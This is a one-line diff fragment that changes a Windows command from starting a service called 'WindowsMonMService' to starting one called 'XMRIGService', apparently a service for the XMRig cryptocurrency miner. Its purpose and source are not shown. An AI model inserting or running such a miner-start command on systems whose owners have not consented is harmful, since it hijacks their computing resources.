@@ -1,1 +1,1 @@
-net start WindowsMonMService
+net start XMRIGService
